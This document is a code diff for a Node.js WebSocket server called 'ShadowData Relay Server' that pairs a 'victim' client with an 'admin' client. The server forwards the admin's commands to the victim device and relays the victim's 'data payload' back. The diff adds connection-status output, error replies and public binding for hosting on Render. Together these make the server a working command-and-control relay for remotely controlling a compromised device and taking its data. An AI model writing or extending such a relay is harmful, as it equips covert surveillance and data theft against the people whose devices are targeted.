@@ -10,52 +10,58 @@ let victimSocket = null;
 let adminSocket = null;
 
 app.get('/', (req, res) => {
-    res.send('ShadowData Relay Server is active.');
+    res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
 });
 
 wss.on('connection', (ws, req) => {
     const urlParams = new URLSearchParams(req.url.split('?')[1]);
-    const role = urlParams.get('role'); // ?role=victim or ?role=admin
+    const role = urlParams.get('role');
 
     if (role === 'victim') {
         victimSocket = ws;
-        console.log('Victim connected successfully.');
+        console.log('>>> Victim connected successfully.');
     } else if (role === 'admin') {
         adminSocket = ws;
-        console.log('Admin connected successfully.');
+        console.log('>>> Admin connected successfully.');
     }
 
     ws.on('message', (message) => {
-    const messageStr = message.toString();
-    console.log(`Received message: ${messageStr}`);
+        const messageStr = message.toString();
+        console.log(`Received message from [${role}]: ${messageStr}`);
 
-    if (ws === adminSocket && victimSocket && victimSocket.readyState === WebSocket.OPEN) {
-        // Forward command from Admin to Victim
-        victimSocket.send(messageStr);
-    } else if (ws === victimSocket && adminSocket && adminSocket.readyState === WebSocket.OPEN) {
-        // Forward data payload back from Victim to Admin
-        adminSocket.send(messageStr);
-    } else {
-        console.log("Routing failed: Either recipient is disconnected or not ready.");
-    }
-});
+        if (role === 'admin') {
+            if (victimSocket && victimSocket.readyState === ws.OPEN) {
+                victimSocket.send(messageStr);
+                console.log('-> Successfully forwarded command to Victim.');
+            } else {
+                console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
+                if (adminSocket && adminSocket.readyState === ws.OPEN) {
+                    adminSocket.send(JSON.stringify({ error: "Victim device is offline or disconnected." }));
+                }
+            }
+        } else if (role === 'victim') {
+            if (adminSocket && adminSocket.readyState === ws.OPEN) {
+                adminSocket.send(messageStr);
+                console.log('-> Successfully forwarded data payload to Admin.');
+            } else {
+                console.log('-> ROUTING FAILED: Admin socket is null or not OPEN.');
+            }
+        }
+    });
 
     ws.on('close', () => {
         if (ws === victimSocket) {
             victimSocket = null;
-            console.log('Victim disconnected.');
+            console.log('XXX Victim disconnected.');
         }
         if (ws === adminSocket) {
             adminSocket = null;
-            console.log('Admin disconnected.');
+            console.log('XXX Admin disconnected.');
         }
     });
 });
 
-// Render assigns a dynamic port via process.env.PORT; default to 10000 if local
 const PORT = process.env.PORT || 10000;
-
-// Explicitly bind to '0.0.0.0' so external Render traffic can reach the app
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server successfully started and listening on port ${PORT}`);
+    console.log(`Server listening on port ${PORT}`);
 });
